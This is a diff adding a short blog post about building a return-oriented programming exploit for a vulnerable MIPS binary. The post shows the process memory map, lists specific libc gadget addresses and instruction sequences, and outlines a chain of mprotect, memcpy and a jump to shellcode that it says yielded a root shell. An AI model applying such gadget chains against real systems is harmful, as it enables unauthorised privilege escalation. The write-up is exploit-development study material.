@@ -1,1 +1,74 @@
 
+---
+layout: post
+title:  "ROP"
+description: ROP with libc gadget
+img: no image
+date: 2018-06-09  +0200
+---
+
+**Condition**
+1. Due to the BOF vulnerability, I am able to control $ra register.
+2. There is no stack canary
+3. DEP is enabled
+4. No PIE option on code & DSO section
+
+**Exploit Step**
+First, I checked the libc address as follow;
+
+{% highlight c %}
+user$ cat /proc/1673/maps 
+00400000-00402000 r-xp 00000000 08:01 320811     /home/user/exploit/vulnerable
+00411000-00412000 rw-p 00001000 08:01 320811     /home/user/exploit/vulnerable
+2aaa8000-2aacb000 r-xp 00000000 08:01 327714     /lib/ld-2.11.3.so
+2aacb000-2aacd000 rw-p 00000000 00:00 0 
+2aad1000-2aad2000 rw-p 00000000 00:00 0 
+2aada000-2aadb000 r--p 00022000 08:01 327714     /lib/ld-2.11.3.so
+2aadb000-2aadc000 rw-p 00023000 08:01 327714     /lib/ld-2.11.3.so
+2aaed000-2ac52000 r-xp 00000000 08:01 327716     /lib/libc-2.11.3.so
+2ac52000-2ac61000 ---p 00165000 08:01 327716     /lib/libc-2.11.3.so
+2ac61000-2ac6a000 r--p 00164000 08:01 327716     /lib/libc-2.11.3.so
+2ac6a000-2ac6c000 rw-p 0016d000 08:01 327716     /lib/libc-2.11.3.so
+2ac6c000-2ac7f000 rw-p 00000000 00:00 0 
+4aa0b000-4aa0d000 rw-p 00000000 00:00 0 
+7ff1f000-7ff34000 rwxp 00000000 00:00 0          [stack]
+
+{% endhighlight %}
+
+We can see that the libc is in 2aaed000 address region.
+Then, I searched the gadgets in libc and i used below gadgets.
+
+{% highlight c %}
+function call first
+0x000f3c1c: move $s0, $v0; lw $ra, 0x1c($sp); move $v0, $zero; lw $s0, 0x18($sp); jr $ra;
+
+function call second
+0x0012877c: move $t9, $s0; lw $ra, 0x24($sp); lw $s2, 0x20($sp); lw $s1, 0x1c($sp); lw $s0, 0x18($sp); jr $t9;
+
+Setting 1st argument
+call twice
+0x000e61ac: move $a0, $s0; lw $ra, 0x1c($sp); lw $s0, 0x18($sp); jr $ra;  
+
+setting 2nd argument
+call twice
+0x0012f3f0: move $a1, $s0; lw $ra, 0x34($sp); lw $s1, 0x30($sp); lw $s0, 0x2c($sp); jr $ra;
+
+setting 3rd argument
+call twice
+0x000d4a50: move $a2, $s1; lw $ra, 0x2c($sp); move $v0, $s1; lw $s1, 0x28($sp); lw $s0, 0x24($sp); jr $ra;
+
+sp to a1
+0x0013f63c: addiu $a1, $sp, 0x20; addiu $a0, $v0, 1; move $t9, $s1; jalr $t9; 
+
+addiu $a0, $sp, 0x20;
+0x000f8204: move $s0, $sp; jalr $t9;
+
+0x000e9aa8: addiu $a1, $sp, 0x18; lw $ra, 0x24($sp); move $at, $at; jr $ra;
+{% endhighlight %}
+
+Using above gadgets, I implemented the exploit code which does following operation
+1. call mprotect to disable DEP x region
+2. call memcpy and copy shellcode to x region
+3. jump to shellcode
+
+I developed exploit code with python using above gadget, and successfully got root shell.
